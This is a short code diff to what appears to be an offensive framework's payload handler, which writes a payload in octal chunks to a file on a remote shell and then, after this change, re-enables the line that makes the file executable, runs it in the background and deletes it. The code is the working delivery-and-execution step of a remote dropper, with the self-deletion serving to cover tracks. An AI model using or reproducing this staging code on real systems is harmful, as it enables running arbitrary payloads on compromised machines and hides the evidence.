@@ -152,7 +152,6 @@ class Handler(Server):
             current = i * echo_max_length
             block = self.bytes_to_octal(payload[current:current + echo_max_length])
             command = echo_stream.format(block, path)
-            print(command)
 
             self.badges.output_multi(f"Uploading payload... ({str(current)}/{str(size)})")
             sender(*args, command)
@@ -160,7 +159,7 @@ class Handler(Server):
         self.badges.output_process("Executing payload...")
         args = args if args is not None else ""
 
-        #sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} && rm {path} 2>/dev/null &\"")
+        sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} && rm {path} 2>/dev/null &\"")
     
     def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';',
                      location='/tmp'):
